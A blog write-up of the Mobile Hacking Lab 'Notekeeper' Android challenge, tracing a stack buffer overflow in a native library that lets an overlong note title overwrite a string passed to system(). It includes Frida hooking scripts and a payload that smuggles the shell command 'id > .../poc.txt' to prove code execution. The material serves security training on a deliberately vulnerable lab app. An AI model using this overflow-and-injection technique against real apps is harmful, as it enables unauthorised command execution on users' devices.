---
title:  "Mobile Hacking Lab Notekeeper Writeup"
date:   2024-01-22T16:33:00-0400
categories:
  - writeup
tags:
  - android
  - ctf
---


Hello everyone!
In this blog post , I will try to explain my solution steps for [Notekeeper](https://www.mobilehackinglab.com/course/lab-notekeeper) challenge from Mobile Hacking Lab. 

## Static Analysis
When we open the app in emulator, it opens a blank screen and with button and with this button we can create notes. When we examine the manifest file, we see that we have one activity(MainActivity). Let's start with it.

### MainActivity

At the beginning of this activity, we see this line:
```java
public final native String parse(String str);
```
It means that we have a native library and we will use `parse` function from this lib file. 

![](./assets/images_mhl_notekeeper/lib.png)

There is a one libnotekeeper.so file inside the apk. But this library file compiled only for arm64-v8a architecture. Because of that i can't run this app on genymotion vm (my pc don't have arm cpu). [Also arm translation tools not supports arm v8 arch.](https://support.genymotion.com/hc/en-us/articles/360010029677-How-to-run-applications-for-arm64-aarch64-armv8#:~:text=Genymotion%20Desktop,PC%20(Windows%2FLinux).) So, I have used corellium instance that provided by MobileHackingLab. 

![](./assets/images_mhl_notekeeper/parse.png)

When we adding a new note, title string passed to parse function from native lib. We can analyze native library file with ghidra decompiler.

![](./assets/images_mhl_notekeeper/ghidra.png)

Inside this function our title variable copied to another char array with for loop. But for loop count, our title's lenght is used and `local_2a4` array have 100 char size. What happens if we give a title longer than 100 characters? 

Also we can see that with memcpy function, `Log \"Note added at $(date)\` string copied to `acStack576` variable and later it will passed to the system function for executing code.👀

I wrote a small frida script for tracing the parameters of `system` and `parse` fucntions. I cant copy-paste from my pc to corellium instance and with this script i can change the argument of parse method with this script easily.

```js
Java.perform(function(){
    let MainActivity = Java.use("com.mobilehackinglab.notekeeper.MainActivity");
    const JavaString = Java.use('java.lang.String');

    MainActivity["parse"].implementation = function(str){
        const payload = JavaString.$new("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEF);
        console.log("parse func called with this arg ==> " + payload);
        const new_ret = this["parse"](payload);
        return new_ret;
    }
});

Interceptor.attach(Module.getExportByName('libc.so', 'system'), {
    onEnter(args) {
        var param1 = Memory.readUtf8String(args[0]);
        console.log("system function param1 ==> " + param1);
    },
    onLeave(retval) {
      
    }
});
```

This time i gave `100*"A" + "BCDEF"` to title. Lets see whats happened:

![](./assets/images_mhl_notekeeper/frida_test2.png)

We have succesfully overwite to `acStack576` variable and our input passed to system function. To understand better, we can use hexdump to follow memory state.

![](./assets/images_mhl_notekeeper/memory1.png)

As seen in screnshot, our title variable written before the text passed to stsyem function. If we can give input longer than 100 char, its overwritten.

![](./assets/images_mhl_notekeeper/memory2.png)

### Code Execution

If we can overwite `system` function argument, we can run command what we want. For testing, i run a http server and from phone, i will download it to app's local directory.

```js
Java.perform(function(){
    let MainActivity = Java.use("com.mobilehackinglab.notekeeper.MainActivity");
    const JavaString = Java.use('java.lang.String');
    MainActivity["parse"].implementation = function(str){
        const payload = JavaString.$new("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAid > /data/data/com.mobilehackinglab.notekeeper/poc.txt;#");
        console.log("parse func called with this arg ==> " + payload);
        const new_ret = this["parse"](payload);
        return new_ret;
    }
});

Interceptor.attach(Module.getExportByName('libc.so', 'system'), {
    onEnter(args) {
        var param1 = Memory.readUtf8String(args[0]);
        console.log("system function param1 ==> " + param1);
    },
    onLeave(retval) {
      
    }
});

```

![](./assets/images_mhl_notekeeper/poc1.png)

We can execute command🎉🎉🎉
Here is the poc video with another command:

[![](https://img.youtube.com/vi/8RmEMxs_Lpk/0.jpg)](https://youtu.be/8RmEMxs_Lpk)

Thanks for reading! See you in next writeups 👋🏻👋🏻